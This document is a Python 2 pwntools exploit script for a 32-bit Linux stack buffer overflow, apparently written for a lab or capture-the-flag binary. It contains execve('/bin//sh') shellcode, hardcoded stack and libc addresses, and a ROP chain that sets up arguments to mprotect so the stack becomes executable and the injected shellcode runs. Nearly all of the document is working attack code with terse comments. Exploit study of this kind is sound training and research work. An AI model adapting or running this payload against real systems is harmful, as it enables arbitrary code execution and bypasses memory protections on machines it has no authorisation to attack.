#!/usr/bin/env python2

from pwn import *

context.update(arch='i386', os='linux')

shellcode = "\x90"*4 + "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"

# We need to guess the location of the shellcode on the stack 
# we need some bruteforcing with command line argument
# the difference of the stack location between console and gdb
#
# We find that the address should be offset = 208
offset = int(sys.argv[1])

#shellcode_base = 0xffffcd4c + offset
shellcode_base = 0xffffcd4c + 208
rop_base = shellcode_base + 104 + 8


# Now we need some memory location 
# we don't call mprotect with a call but after it sets up the arguments
# we setup arguments with ROP chain
#gdb-peda$ disassemble mprotect
#Dump of assembler code for function mprotect:
#   0xf7d1c450 <+0>:     push   ebx
#   0xf7d1c451 <+1>:     mov    edx,DWORD PTR [esp+0x10]   <----- edx: permission (0x07)
#   0xf7d1c455 <+5>:     mov    ecx,DWORD PTR [esp+0xc]    <----- ecx: size of area to change
#   0xf7d1c459 <+9>:     mov    ebx,DWORD PTR [esp+0x8]    <----- ebx: address of memory to change
#   0xf7d1c45d <+13>:    mov    eax,0x7d                  <-------- we'll jump here
#   0xf7d1c462 <+18>:    call   DWORD PTR gs:0x10
#   0xf7d1c469 <+25>:    pop    ebx
#   0xf7d1c46a <+26>:    cmp    eax,0xfffff001
#   0xf7d1c46f <+31>:    jae    0xf7c23440
#   0xf7d1c475 <+37>:    ret

mprotect =    p32(0xf7d1c45d)

# Some gadgets 
pop_ecx_edx = p32(0xf7c38e2b)
pop_ebx =     p32(0xf7c3a28c)
dec_ebx =     p32(0xf7ce5cc1)
inc_edx =     p32(0xf7c9da78)

# we don't call mprotect with a call but 
# Size argument for mprotect
mprot_size = p32(0x01010101)

# address for mprotect (null free size, to be decremented). Beginning of stack
mprot_buff = p32(0xfffdd001)

# mprotect permission (we 0x07: we use 0xfffffffff and increase it 8 time by 1)
mprot_permission = p32(0xffffffff) 

# NOw prepare the payload
# - 100 bytes of shellcode
# - our ROP code address
# - ecx esp adjust to previous 4 bytes
# - ROP chain to call mprotect
# - shellcode address

payload = shellcode
payload += 'A'* (104-len(shellcode))
payload += p32(rop_base)
payload += pop_ebx
payload += mprot_buff
payload += pop_ecx_edx
payload += mprot_size
payload += mprot_permission
payload += dec_ebx
payload += inc_edx
payload += inc_edx
payload += inc_edx
payload += inc_edx
payload += inc_edx
payload += inc_edx
payload += inc_edx
payload += inc_edx

payload += mprotect
payload += "DUMM" #to adjust the non 
payload += p32(shellcode_base)


print payload

